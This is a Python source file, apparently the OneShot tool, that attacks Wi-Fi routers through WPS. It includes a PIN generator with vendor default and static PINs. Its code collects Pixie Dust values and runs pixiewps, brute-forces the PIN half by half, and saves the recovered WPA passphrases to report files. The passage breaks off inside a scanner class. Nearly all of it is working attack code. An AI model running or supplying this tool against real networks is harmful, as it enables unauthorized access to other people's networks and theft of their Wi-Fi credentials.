#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys
import subprocess
import os
import tempfile
import shutil
import re
import codecs
import socket
import pathlib
import time
from datetime import datetime
import collections
import statistics
import csv


class WPSException(Exception):
    pass


class WPSpin(object):
    '''WPS pin generator'''
    def __init__(self):
        self.ALGO_MAC = 0
        self.ALGO_EMPTY = 1
        self.ALGO_STATIC = 2

        self.algos = {}
        self.algos['pin24'] = {'name': '24-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin24}
        self.algos['pin28'] = {'name': '28-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin28}
        self.algos['pin32'] = {'name': '32-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin32}
        self.algos['pinDLink'] = {'name': 'D-Link PIN', 'mode': self.ALGO_MAC, 'gen': self.pinDLink}
        self.algos['pinDLink1'] = {'name': 'D-Link PIN +1', 'mode': self.ALGO_MAC, 'gen': self.pinDLink1}
        self.algos['pinASUS'] = {'name': 'ASUS PIN', 'mode': self.ALGO_MAC, 'gen': self.pinASUS}
        self.algos['pinAirocon'] = {'name': 'Airocon Realtek', 'mode': self.ALGO_MAC, 'gen': self.pinAirocon}
        # Static pin algos
        self.algos['pinEmpty'] = {'name': 'Empty PIN', 'mode': self.ALGO_EMPTY, 'gen': lambda mac: ''}
        self.algos['pinCisco'] = {'name': 'Cisco', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1234567}
        self.algos['pinBrcm1'] = {'name': 'Broadcom 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2017252}
        self.algos['pinBrcm2'] = {'name': 'Broadcom 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4626484}
        self.algos['pinBrcm3'] = {'name': 'Broadcom 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7622990}
        self.algos['pinBrcm4'] = {'name': 'Broadcom 4', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6232714}
        self.algos['pinBrcm5'] = {'name': 'Broadcom 5', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1086411}
        self.algos['pinBrcm6'] = {'name': 'Broadcom 6', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3195719}
        self.algos['pinAirc1'] = {'name': 'Airocon 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3043203}
        self.algos['pinAirc2'] = {'name': 'Airocon 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7141225}
        self.algos['pinDSL2740R'] = {'name': 'DSL-2740R', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6817554}
        self.algos['pinRealtek1'] = {'name': 'Realtek 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9566146}
        self.algos['pinRealtek2'] = {'name': 'Realtek 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9571911}
        self.algos['pinRealtek3'] = {'name': 'Realtek 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4856371}
        self.algos['pinUpvel'] = {'name': 'Upvel', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2085483}
        self.algos['pinUR814AC'] = {'name': 'UR-814AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4397768}
        self.algos['pinUR825AC'] = {'name': 'UR-825AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 529417}
        self.algos['pinOnlime'] = {'name': 'Onlime', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9995604}
        self.algos['pinEdimax'] = {'name': 'Edimax', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3561153}
        self.algos['pinThomson'] = {'name': 'Thomson', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6795814}
        self.algos['pinHG532x'] = {'name': 'HG532x', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3425928}
        self.algos['pinH108L'] = {'name': 'H108L', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9422988}
        self.algos['pinONO'] = {'name': 'CBN ONO', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9575521}

    def _parseMAC(self, mac):
        mac = mac.replace(':', '').replace('-', '').replace('.', '')
        mac = int(mac, 16)
        return mac

    def _parseOUI(self, mac):
        mac = mac.replace(':', '').replace('-', '').replace('.', '')
        oui = int(mac[:6], 16)
        return oui

    def checksum(self, pin):
        '''
        Standard WPS checksum algorithm.
        @pin — A 7 digit pin to calculate the checksum for.
        Returns the checksum value.
        '''
        accum = 0
        while pin:
            accum += (3 * (pin % 10))
            pin = int(pin / 10)
            accum += (pin % 10)
            pin = int(pin / 10)
        return ((10 - accum % 10) % 10)

    def generate(self, algo, mac):
        '''
        WPS pin generator
        @algo — the WPS pin algorithm ID
        Returns the WPS pin string value
        '''
        mac = self._parseMAC(mac)
        if algo not in self.algos:
            raise WPSException('Invalid WPS pin algorithm')
        pin = self.algos[algo]['gen'](mac)
        if algo == 'pinEmpty':
            return pin
        pin = pin % 10000000
        pin = str(pin) + str(self.checksum(pin))
        return pin.zfill(8)

    def getSuggested(self, mac):
        '''
        Get all suggested WPS pin's for single MAC
        '''
        algos = self.suggest(mac)
        res = []
        for ID in algos:
            algo = self.algos[ID]
            item = {}
            item['id'] = ID
            if algo['mode'] == self.ALGO_STATIC:
                item['name'] = 'Static PIN — ' + algo['name']
            else:
                item['name'] = algo['name']
            item['pin'] = self.generate(ID, mac)
            res.append(item)
        return res

    def getSuggestedList(self, mac):
        '''
        Get all suggested WPS pin's for single MAC as list
        '''
        algos = self.suggest(mac)
        res = []
        for algo in algos:
            res.append(self.generate(algo, mac))
        return res

    def getLikely(self, mac):
        res = self.getSuggestedList(mac)
        if res:
            return res[0]
        else:
            return None

    def suggest(self, mac):
        '''
        Get algos suggestions for single MAC
        Returns the algo ID
        '''
        oui = self._parseOUI(mac)
        algorithms = {
            'pin24': (3318, 5329, 7391, 7967, 8821, 8951, 9819, 9934, 26187, 40998, 45068, 57376, 311149, 528501, 555596, 558651, 941390, 1080303, 1354211, 1358184, 1365581, 1867493, 2099437, 2108353, 2150192, 2631773, 2762845, 3180336, 3322588, 3435475, 3455642, 3676006, 4213251, 5021439, 5041630, 5135694, 5269488, 6048937, 6071197, 6091947, 6431549, 6438116, 6438399, 6443988, 6444444, 6450131, 6454622, 6461119, 6465764, 6469254, 6471791, 6473247, 6473492, 6474664, 6475198, 6482043, 6559472, 6582274, 6862543, 6954343, 6955837, 6957149, 6962687, 6968276, 6968732, 6974419, 6978910, 6985407, 6990052, 6996079, 6997535, 6997780, 6998952, 6999486, 7000414, 7000423, 7478631, 7480125, 7486692, 7486975, 7492564, 7493020, 7498707, 7503198, 7509695, 7514340, 7520367, 7521823, 7522068, 7523240, 7523774, 7524702, 7530619, 7891593, 7900663, 8396546, 8702386, 8971179, 9329998, 9475300, 9496250, 10000337, 10548161, 11151453, 11552890, 11580124, 11683580, 11834446, 12325889, 12383877, 12888093, 13122101, 13134983, 13393230, 13524302, 13921884, 13942655, 14183657, 14216087, 14446916, 14696758, 14732110, 14827830, 14828534, 14974201, 15256877, 15345757, 15475517, 15483894, 15518512, 15614966, 15905500, 16031731, 16259687, 16302225, 16306449, 16545046, 16577832, 16708904),
            'pin28': (2100167, 4736763, 13920936, 16272063),
            'pin32': (1830, 1073899, 1097544, 1366761, 1859371, 2927397, 3179945, 3179945, 4779532, 5260893, 5506214, 8396546, 8398473, 9473400, 13131776, 14221027, 15256600, 16018692, 16550807),
            'pinDLink': (5329, 1365581, 1867493, 2625659, 8702386, 10529563, 12100486, 12624059, 13414997, 14216087, 16545046),
            'pinDLink1': (5329, 6375, 6491, 7408, 7768, 8593, 8880, 9217, 9818, 1365581, 1867493, 3409924, 6085016, 8702386, 12100486, 13155865, 13161379, 13414997),
            'pinASUS': (1830, 1830, 6012, 6012, 7846, 12367, 57420, 298296, 299558, 528503, 528504, 528505, 540253, 548974, 549478, 1080132, 1097544, 1098619, 1113837, 1367465, 1580664, 1852441, 1869612, 1881900, 2367687, 2391840, 2905820, 2927397, 2948513, 3168826, 3179945, 3681354, 3724615, 3939844, 4200062, 4256257, 4516317, 4779532, 5260893, 5530841, 5546064, 5552138, 5798889, 6309323, 6333516, 6345130, 6574462, 6609236, 7084431, 7107104, 7142841, 7359867, 7365304, 7655467, 7873711, 7885870, 7920031, 8136292, 8404829, 8692771, 8955590, 8968182, 9179348, 9209899, 9456970, 9466498, 9500242, 9763762, 10247310, 10492713, 10548161, 11073504, 11280907, 11312663, 11313683, 11562687, 12080400, 12119566, 12334080, 12359296, 12381819, 12624059, 12849909, 12888093, 13131776, 13144569, 13635289, 13637570, 13665456, 14176486, 14221027, 14696265, 14991085, 15242486, 15256600, 15473241, 15475328, 15486029, 15759705, 16001107, 16006753, 16018415, 16265956, 16296709, 16312579, 16550807),
            'pinAirocon': (1830, 2859, 3828, 4915, 6012, 6895, 57419, 135192, 528499, 528503, 1053678, 2927397, 7900244, 8404829, 9763762, 12359296, 16006753, 16550807),
            'pinEmpty': (3727, 19063, 825023, 1073899, 1097461, 1859371, 2159523, 2921855, 3427818, 3725359, 3971186, 5553747, 5821806, 6558572, 6856950, 7351842, 7380781, 7645070, 7648638, 7658202, 7897346, 7902388, 7902850, 8141139, 8398473, 8966772, 9201864, 9742263, 9966387, 10278467, 10529563, 11330069, 13160798, 13280102, 13656204, 13902114, 13918435, 13924074, 14704742, 14970643, 15475328),
            'pinCisco': (6699, 9356, 9752, 3427819, 7369148, 14707093, 14732110),
            'pinBrcm1': (6825, 1315915, 9997149, 11334111, 12383877, 13161379, 15491684),
            'pinBrcm2': (1365581, 1867493, 2625659, 8702386, 12100486, 12383877, 13155865),
            'pinBrcm3': (1365581, 1867493, 2625659, 8127308, 12100486, 12383877, 13155865),
            'pinBrcm4': (1365581, 1597996, 1867493, 2117247, 2625659, 4986859, 8127448, 8702386, 12100486, 12383877, 13155865, 13161379, 13414997, 14183657, 16545046),
            'pinBrcm5': (1365581, 1597996, 1867493, 2117247, 2625659, 4986859, 8127448, 8702386, 12100486, 12383877, 13155865, 13161379, 13414997, 14183657, 16545046),
            'pinBrcm6': (1365581, 1597996, 1867493, 2117247, 2625659, 4986859, 8127448, 8702386, 12100486, 12383877, 13155865, 13161379, 13414997, 14183657, 16545046),
            'pinAirc1': (1580664, 4256257, 4516317, 13665456),
            'pinAirc2': (8692771, 8955590, 9179348),
            'pinDSL2740R': (9818, 1883577, 3409924, 6085016, 8702386, 16545046),
            'pinRealtek1': (3138, 3816, 5329),
            'pinRealtek2': (29283, 14991085),
            'pinRealtek3': (575155,),
            'pinUpvel': (16302225,),
            'pinUR814AC': (13942655,),
            'pinUR825AC': (13942655,),
            'pinOnlime': (5329, 7881846, 13942655, 16302225),
            'pinEdimax': (57420, 8396546),
            'pinThomson': (9764, 4469448, 8976327, 13370362),
            'pinHG532x': (26187, 549729, 555596, 825023, 1358184, 2099437, 2386341, 3435475, 7891593, 8971179, 10273138, 11330069, 13410851, 13662901, 15256877, 16253203, 16268799),
            'pinH108L': (4983220, 5024778, 10277451, 11564501, 13132999, 14418574, 16566423),
            'pinONO': (6042939, 14439292)
        }
        res = []
        for ID, OUI in algorithms.items():
            if oui in OUI:
                res.append(ID)
        return res

    def pin24(self, mac):
        return (mac & 0xFFFFFF)

    def pin28(self, mac):
        return (mac & 0xFFFFFFF)

    def pin32(self, mac):
        return (mac % 0x100000000)

    def pinDLink(self, mac):
        # Get the NIC part
        nic = mac & 0xFFFFFF
        # Calculating pin
        pin = nic ^ 0x55AA55
        pin ^= (((pin & 0xF) << 4) +
                ((pin & 0xF) << 8) +
                ((pin & 0xF) << 12) +
                ((pin & 0xF) << 16) +
                ((pin & 0xF) << 20))
        pin %= int(10e6)
        if pin < int(10e5):
            pin += ((pin % 9) * int(10e5)) + int(10e5)
        return pin

    def pinDLink1(self, mac):
        return self.pinDLink(mac + 1)

    def pinASUS(self, mac):
        mac = hex(mac).split('x')[-1].upper().zfill(12)
        b = []
        for i in range(0, 12, 2):
            b.append(int(mac[i:i+2], 16))
        pin = ''
        for i in range(7):
            pin += str((b[i % 6] + b[5]) % (10 - (i + b[1] + b[2] + b[3] + b[4] + b[5]) % 7))
        return int(pin)

    def pinAirocon(self, mac):
        mac = hex(mac).split('x')[-1].upper().zfill(12)
        b = []
        for i in range(0, 12, 2):
            b.append(int(mac[i:i+2], 16))
        pin = ((b[0] + b[1]) % 10)\
        + (((b[5] + b[0]) % 10) * 10)\
        + (((b[4] + b[5]) % 10) * 100)\
        + (((b[3] + b[4]) % 10) * 1000)\
        + (((b[2] + b[3]) % 10) * 10000)\
        + (((b[1] + b[2]) % 10) * 100000)\
        + (((b[0] + b[1]) % 10) * 1000000)
        return pin


def recvuntil(pipe, what):
    s = ''
    while True:
        inp = pipe.stdout.read(1)
        if inp == '':
            return s
        s += inp
        if what in s:
            return s


def get_hex(line):
    a = line.split(':', 3)
    return a[2].replace(' ', '').upper()


class PixiewpsData(object):
    def __init__(self):
        self.pke = ''
        self.pkr = ''
        self.e_hash1 = ''
        self.e_hash2 = ''
        self.authkey = ''
        self.e_nonce = ''

    def clear(self):
        self.__init__()

    def got_all(self):
        return (self.pke and self.pkr and self.e_nonce and self.authkey
                and self.e_hash1 and self.e_hash2)

    def get_pixie_cmd(self, full_range=False):
        pixiecmd = "pixiewps --pke {} --pkr {} --e-hash1 {}\
                    --e-hash2 {} --authkey {} --e-nonce {}".format(
                    self.pke, self.pkr, self.e_hash1,
                    self.e_hash2, self.authkey, self.e_nonce)
        if full_range:
            pixiecmd += ' --force'
        return pixiecmd


class ConnectionStatus(object):
    def __init__(self):
        self.status = ''   # Must be WSC_NACK, WPS_FAIL or GOT_PSK
        self.last_m_message = 0
        self.essid = ''
        self.wpa_psk = ''

    def isFirstHalfValid(self):
        return self.last_m_message > 5

    def clear(self):
        self.__init__()


class BruteforceStatus(object):
    def __init__(self):
        self.start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.mask = ''
        self.last_attempt_time = time.time()   # Last PIN attempt start time
        self.attempts_times = collections.deque(maxlen=15)

        self.counter = 0
        self.statistics_period = 5

    def display_status(self):
        average_pin_time = statistics.mean(self.attempts_times)
        if len(self.mask) == 4:
            percentage = int(self.mask) / 11000 * 100
        else:
            percentage = ((10000 / 11000) + (int(self.mask[4:]) / 11000)) * 100
        print('[*] {:.2f}% complete @ {} ({:.2f} seconds/pin)'.format(
            percentage, self.start_time, average_pin_time))

    def registerAttempt(self, mask):
        self.mask = mask
        self.counter += 1
        current_time = time.time()
        self.attempts_times.append(current_time - self.last_attempt_time)
        self.last_attempt_time = current_time
        if self.counter == self.statistics_period:
            self.counter = 0
            self.display_status()

    def clear(self):
        self.__init__()


class Companion(object):
    """Main application part"""
    def __init__(self, interface, save_result=False, print_debug=False, bssid=''):
        self.interface = interface
        self.save_result = save_result
        self.print_debug = print_debug

        self.tempdir = tempfile.mkdtemp()
        with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
            temp.write('ctrl_interface={}\nctrl_interface_group=root\nupdate_config=1\n'.format(self.tempdir))
            self.tempconf = temp.name
        self.wpas_ctrl_path = f"{self.tempdir}/{interface}"
        self.__init_wpa_supplicant()

        self.res_socket_file = f"{tempfile._get_default_tempdir()}/{next(tempfile._get_candidate_names())}"
        self.retsock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        self.retsock.bind(self.res_socket_file)

        self.pixie_creds = PixiewpsData()
        self.connection_status = ConnectionStatus()

        user_home = str(pathlib.Path.home())
        self.sessions_dir = f'{user_home}/.OneShot/sessions/'
        self.pixiewps_dir = f'{user_home}/.OneShot/pixiewps/'
        self.reports_dir = os.path.dirname(os.path.realpath(__file__)) + '/reports/'
        if not os.path.exists(self.sessions_dir):
            os.makedirs(self.sessions_dir)
        if not os.path.exists(self.pixiewps_dir):
            os.makedirs(self.pixiewps_dir)

        self.generator = WPSpin()

        self.bssid = bssid
        self.lastPwr = 0

    def __init_wpa_supplicant(self):
        print('[*] Running wpa_supplicant…')
        cmd = 'wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired -i{} -c{}'.format(self.interface, self.tempconf)
        self.wpas = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, encoding='utf-8')
        # Waiting for wpa_supplicant control interface initialization
        while not os.path.exists(self.wpas_ctrl_path):
            pass

    def sendOnly(self, command):
        '''Sends command to wpa_supplicant'''
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)

    def sendAndReceive(self, command):
        '''Sends command to wpa_supplicant and returns the reply'''
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)
        (b, address) = self.retsock.recvfrom(4096)
        inmsg = b.decode('utf-8')
        return inmsg

    def __handle_wpas(self, pixiemode=False, verbose=None, bssid=""):
        if not verbose:
            verbose = self.print_debug
        line = self.wpas.stdout.readline()
        if not line:
            self.wpas.wait()
            return False
        line = line.rstrip('\n')

        if verbose:
            sys.stderr.write(line + '\n')

        if line.startswith('WPS: '):
            if 'Building Message M' in line:
                n = int(line.split('Building Message M')[1].replace('D', ''))
                self.connection_status.last_m_message = n
                self.__print_with_indicators('*', 'Sending WPS Message M{}…'.format(n))
            elif 'Received M' in line:
                n = int(line.split('Received M')[1])
                self.connection_status.last_m_message = n
                self.__print_with_indicators('*', 'Received WPS Message M{}'.format(n))
                if n == 5:
                    print('[+] The first half of the PIN is valid')
            elif 'Received WSC_NACK' in line:
                self.connection_status.status = 'WSC_NACK'
                self.__print_with_indicators('*', 'Received WSC NACK')
                print('[-] Error: wrong PIN code')
            elif 'Enrollee Nonce' in line and 'hexdump' in line:
                self.pixie_creds.e_nonce = get_hex(line)
                assert(len(self.pixie_creds.e_nonce) == 16*2)
                if pixiemode:
                    print('[P] E-Nonce: {}'.format(self.pixie_creds.e_nonce))
            elif 'DH own Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pkr = get_hex(line)
                assert(len(self.pixie_creds.pkr) == 192*2)
                if pixiemode:
                    print('[P] PKR: {}'.format(self.pixie_creds.pkr))
            elif 'DH peer Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pke = get_hex(line)
                assert(len(self.pixie_creds.pke) == 192*2)
                if pixiemode:
                    print('[P] PKE: {}'.format(self.pixie_creds.pke))
            elif 'AuthKey' in line and 'hexdump' in line:
                self.pixie_creds.authkey = get_hex(line)
                assert(len(self.pixie_creds.authkey) == 32*2)
                if pixiemode:
                    print('[P] AuthKey: {}'.format(self.pixie_creds.authkey))
            elif 'E-Hash1' in line and 'hexdump' in line:
                self.pixie_creds.e_hash1 = get_hex(line)
                assert(len(self.pixie_creds.e_hash1) == 32*2)
                if pixiemode:
                    print('[P] E-Hash1: {}'.format(self.pixie_creds.e_hash1))
            elif 'E-Hash2' in line and 'hexdump' in line:
                self.pixie_creds.e_hash2 = get_hex(line)
                assert(len(self.pixie_creds.e_hash2) == 32*2)
                if pixiemode:
                    print('[P] E-Hash2: {}'.format(self.pixie_creds.e_hash2))
            elif 'Network Key' in line and 'hexdump' in line:
                self.connection_status.status = 'GOT_PSK'
                self.connection_status.wpa_psk = bytes.fromhex(get_hex(line)).decode('utf-8')
        elif ': State: ' in line:
            if '-> SCANNING' in line:
                self.connection_status.status = 'scanning'
                self.__print_with_indicators('*', 'Scanning…')
        elif ('WPS-FAIL' in line) and (self.connection_status.status != ''):
            self.connection_status.status = 'WPS_FAIL'
            print('[-] wpa_supplicant returned WPS-FAIL')
#        elif 'NL80211_CMD_DEL_STATION' in line:
#            print("[!] Unexpected interference — kill NetworkManager/wpa_supplicant!")
        elif 'Trying to authenticate with' in line:
            self.connection_status.status = 'authenticating'
            if 'SSID' in line:
                self.connection_status.essid = codecs.decode(line.split("'")[1], 'unicode-escape').encode('latin1').decode('utf-8', errors='ignore')
                self.__print_with_indicators('*', 'Authenticating…')
        elif 'Authentication response' in line:
            self.__print_with_indicators('*', 'Authenticated')
        elif 'Trying to associate with' in line:
            self.connection_status.status = 'associating'
            if 'SSID' in line:
                self.connection_status.essid = codecs.decode(line.split("'")[1], 'unicode-escape').encode('latin1').decode('utf-8', errors='ignore')
            self.__print_with_indicators('*', 'Associating with AP…')
        elif ('Associated with' in line) and (self.interface in line):
            bssid = line.split()[-1].upper()
            if self.connection_status.essid:
                self.__print_with_indicators('+', 'Associated with {} (ESSID: {})'.format(bssid, self.connection_status.essid))
            else:
                self.__print_with_indicators('+', 'Associated with {}'.format(bssid))
        elif 'EAPOL: txStart' in line:
            self.connection_status.status = 'eapol_start'
            self.__print_with_indicators('*', 'Sending EAPOL Start…')
        elif 'EAP entering state IDENTITY' in line:
            self.__print_with_indicators('*', 'Received Identity Request')
        elif 'using real identity' in line:
            self.__print_with_indicators('*', 'Sending Identity Response…')
        elif self.bssid in line and 'level=' in line:
            self.lastPwr = line.split("level=")[1].split(" ")[0]
        elif bssid in line and 'level=' in line:
            signal = line.split("level=")[1].split(" ")[0]
            if 'noise=' in line:
                noise = line.split("noise=")[1].split(" ")[0]
                print ("[i] Current signal: {}, noise: {}".format(signal, noise))
            else:
                print ("[i] Current signal: {}".format(signal))

        return True

    def __runPixiewps(self, showcmd=False, full_range=False):
        cmd = self.pixie_creds.get_pixie_cmd(full_range)
        if showcmd:
            print(cmd)
        self.__print_with_indicators('*', 'Running Pixiewps…')
        r = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                           stderr=sys.stdout, encoding='utf-8')
        print(r.stdout)
        if r.returncode == 0:
            lines = r.stdout.splitlines()
            for line in lines:
                if ('[+]' in line) and ('WPS pin' in line):
                    pin = line.split(':')[-1].strip()
                    if pin == '<empty>':
                        pin = "''"
                    return pin
        return False

    def __credentialPrint(self, wps_pin=None, wpa_psk=None, essid=None):
        print(f"[+] WPS PIN: '{wps_pin}'")
        print(f"[+] WPA PSK: '{wpa_psk}'")
        print(f"[+] AP SSID: '{essid}'")

    def __saveResult(self, bssid, essid, wps_pin, wpa_psk):
        if not os.path.exists(self.reports_dir):
            os.makedirs(self.reports_dir)
        filename = self.reports_dir + 'stored'
        dateStr = datetime.now().strftime("%d.%m.%Y %H:%M")
        with open(filename + '.txt', 'a', encoding='utf-8') as file:
            file.write('BSSID: {}\nDatetime: {}\nESSID: {}\nWPS PIN: {}\nWPA PSK: {}\n\n'.format(
                        bssid, dateStr, essid, wps_pin, wpa_psk
                    )
            )
        writeTableHeader = not os.path.isfile(filename + '.csv')
        with open(filename + '.csv', 'a', newline='', encoding='utf-8') as file:
            csvWriter = csv.writer(file, delimiter=';', quoting=csv.QUOTE_ALL)
            if writeTableHeader:
                csvWriter.writerow(['Date', 'BSSID', 'ESSID', 'WPS PIN', 'WPA PSK'])
            csvWriter.writerow([dateStr, bssid, essid, wps_pin, wpa_psk])
        print(f'[i] Credentials saved to {filename}.txt, {filename}.csv')

    def __savePin(self, bssid, pin):
        filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
        with open(filename, 'w') as file:
            file.write(pin)
        print('[i] PIN saved in {}'.format(filename))

    def __prompt_wpspin(self, bssid):
        pins = self.generator.getSuggested(bssid)
        if len(pins) > 1:
            print(f'PINs generated for {bssid}:')
            print('{:<3} {:<10} {:<}'.format('#', 'PIN', 'Name'))
            for i, pin in enumerate(pins):
                number = '{})'.format(i + 1)
                line = '{:<3} {:<10} {:<}'.format(
                    number, pin['pin'], pin['name'])
                print(line)
            while 1:
                pinNo = input('Select the PIN: ')
                try:
                    if int(pinNo) in range(1, len(pins)+1):
                        pin = pins[int(pinNo) - 1]['pin']
                    else:
                        raise IndexError
                except Exception:
                    print('Invalid number')
                else:
                    break
        elif len(pins) == 1:
            pin = pins[0]
            print('[i] The only probable PIN is selected:', pin['name'])
            pin = pin['pin']
        else:
            return None
        return pin

    def __wps_connection(self, bssid, pin, pixiemode=False, verbose=None):
        if not verbose:
            verbose = self.print_debug
        self.pixie_creds.clear()
        self.connection_status.clear()
        self.wpas.stdout.read(300)   # Clean the pipe
        print(f"[*] Trying PIN '{pin}'…")

        r = self.sendAndReceive(f'WPS_REG {bssid} {pin}')
        if 'OK' not in r:
            self.connection_status.status = 'WPS_FAIL'
            print('[!] Something went wrong — check out debug log')
            return False

        while True:
            res = self.__handle_wpas(pixiemode=pixiemode, verbose=verbose, bssid=bssid.lower())
            if not res:
                break
            if self.connection_status.status == 'WSC_NACK':
                break
            elif self.connection_status.status == 'GOT_PSK':
                break
            elif self.connection_status.status == 'WPS_FAIL':
                break

        self.sendOnly('WPS_CANCEL')
        return False

    def single_connection(self, bssid, pin=None, pixiemode=False, showpixiecmd=False,
                          pixieforce=False, store_pin_on_fail=False):
        if not pin:
            if pixiemode:
                try:
                    # Try using the previous calculated PIN
                    filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
                    with open(filename, 'r') as file:
                        t_pin = file.readline().strip()
                        #if input('[?] Use previous calculated PIN {}? [n/Y] '.format(t_pin)).lower() != 'n':
                        pin = t_pin
                        #else:
                        #    raise FileNotFoundError
                except FileNotFoundError:
                    pin = self.generator.getLikely(bssid) or '12345670'
            else:
                # If not pixiemode, ask user to select a pin from the list
                pin = self.__prompt_wpspin(bssid) or '12345670'

        if store_pin_on_fail:
            try:
                self.__wps_connection(bssid, pin, pixiemode)
            except KeyboardInterrupt:
                print("\nAborting…")
                self.__savePin(bssid, pin)
                return False
        else:
            self.__wps_connection(bssid, pin, pixiemode)

        if self.connection_status.status == 'GOT_PSK':
            self.__credentialPrint(pin, self.connection_status.wpa_psk, self.connection_status.essid)
            if self.save_result:
                self.__saveResult(bssid, self.connection_status.essid, pin, self.connection_status.wpa_psk)
            # Try to remove temporary PIN file
            filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
            try:
                os.remove(filename)
            except FileNotFoundError:
                pass
            return True
        elif pixiemode:
            if self.pixie_creds.got_all():
                pin = self.__runPixiewps(showpixiecmd, pixieforce)
                if pin:
                    return self.single_connection(bssid, pin, pixiemode=False, store_pin_on_fail=True)
                return False
            else:
                print('[!] No enough data to run Pixie Dust attack')
                return False
        else:
            if store_pin_on_fail:
                # Saving Pixiewps calculated PIN if can't connect
                self.__savePin(bssid, pin)
            return False

    def __first_half_bruteforce(self, bssid, f_half, delay=None):
        '''
        @f_half — 4-character string
        '''
        checksum = self.generator.checksum
        while int(f_half) < 10000:
            t = int(f_half + '000')
            pin = '{}000{}'.format(f_half, checksum(t))
            self.single_connection(bssid, pin)
            if self.connection_status.isFirstHalfValid():
                print('[+] First half found')
                return f_half
            elif self.connection_status.status == 'WPS_FAIL':
                print('[!] WPS transaction failed, re-trying last pin')
                return self.__first_half_bruteforce(bssid, f_half)
            f_half = str(int(f_half) + 1).zfill(4)
            self.bruteforce.registerAttempt(f_half)
            if delay:
                time.sleep(delay)
        print('[-] First half not found')
        return False

    def __second_half_bruteforce(self, bssid, f_half, s_half, delay=None):
        '''
        @f_half — 4-character string
        @s_half — 3-character string
        '''
        checksum = self.generator.checksum
        while int(s_half) < 1000:
            t = int(f_half + s_half)
            pin = '{}{}{}'.format(f_half, s_half, checksum(t))
            self.single_connection(bssid, pin)
            if self.connection_status.last_m_message > 6:
                return pin
            elif self.connection_status.status == 'WPS_FAIL':
                print('[!] WPS transaction failed, re-trying last pin')
                return self.__second_half_bruteforce(bssid, f_half, s_half)
            s_half = str(int(s_half) + 1).zfill(3)
            self.bruteforce.registerAttempt(f_half + s_half)
            if delay:
                time.sleep(delay)
        return False

    def smart_bruteforce(self, bssid, start_pin=None, delay=None):
        if (not start_pin) or (len(start_pin) < 4):
            # Trying to restore previous session
            try:
                filename = self.sessions_dir + '{}.run'.format(bssid.replace(':', '').upper())
                with open(filename, 'r') as file:
                    if input('[?] Restore previous session for {}? [n/Y] '.format(bssid)).lower() != 'n':
                        mask = file.readline().strip()
                    else:
                        raise FileNotFoundError
            except FileNotFoundError:
                mask = '0000'
        else:
            mask = start_pin[:7]

        try:
            self.bruteforce = BruteforceStatus()
            self.bruteforce.mask = mask
            if len(mask) == 4:
                f_half = self.__first_half_bruteforce(bssid, mask, delay)
                if f_half and (self.connection_status.status != 'GOT_PSK'):
                    self.__second_half_bruteforce(bssid, f_half, '001', delay)
            elif len(mask) == 7:
                f_half = mask[:4]
                s_half = mask[4:]
                self.__second_half_bruteforce(bssid, f_half, s_half, delay)
            raise KeyboardInterrupt
        except KeyboardInterrupt:
            print("\nAborting…")
            filename = self.sessions_dir + '{}.run'.format(bssid.replace(':', '').upper())
            with open(filename, 'w') as file:
                file.write(self.bruteforce.mask)
            print('[i] Session saved in {}'.format(filename))

    def __print_with_indicators(self, level, msg):
        print('[{}] [{}] {}'.format(level, self.lastPwr, msg))

    def cleanup(self):
        self.retsock.close()
        self.wpas.terminate()
        os.remove(self.res_socket_file)
        shutil.rmtree(self.tempdir, ignore_errors=True)
        os.remove(self.tempconf)

    def __del__(self):
        self.cleanup()


class WiFiScanner(object):
    """docstring for WiFiScanner"""
    def __init__(self, interface, vuln_list=None):
        self.interface = interface
        self.vuln_list = vuln_list

        reports_fname = os.path.dirname(os.path.realpath(__file__)) + '/reports/stored.csv'
        try:
            with open(reports_fname, 'r', newline='', encoding='utf-8') as file:
                csvReader = csv.reader(file, delimiter=';', quoting=csv.QUOTE_ALL)
                # Skip header
                next(csvReader)
                self.stored = []
                for row in csvReader:
                    self.stored.append(
                        (
                            row[1],   # BSSID
                            row[2]    # ESSID
                        )
                    )
        except FileNotFoundError:
            self.stored = []

    def iw_scanner(self):
        '''Parsing iw scan results'''
        def handle_network(line, result, networks):
            networks.append(
                    {
                        'Security type': 'Unknown',
                        'WPS': False,
                        'WPS locked': False,
                        'Model': '',
                        'Model number': '',
                        'Device name': ''
                     }
                )
            networks[-1]['BSSID'] = result.group(1).upper()

